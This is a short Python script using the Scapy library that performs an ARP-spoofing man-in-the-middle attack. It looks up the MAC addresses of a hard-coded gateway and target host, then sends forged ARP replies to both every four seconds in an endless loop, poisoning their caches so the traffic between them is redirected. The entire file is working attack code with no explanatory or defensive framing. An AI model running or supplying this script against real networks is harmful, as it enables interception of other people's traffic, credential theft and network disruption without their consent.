from scapy.all import *

gateway_ip = '198.13.13.1'
target_ip = '198.13.0.14'
gateway_mac = ''
target_mac = ''

def arp_spoof():
    while (True):
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
        time.sleep(4)

def get_mac(ip_addr):
    ans, unans = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip_addr), retry=2, timeout=10)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)
arp_spoof()
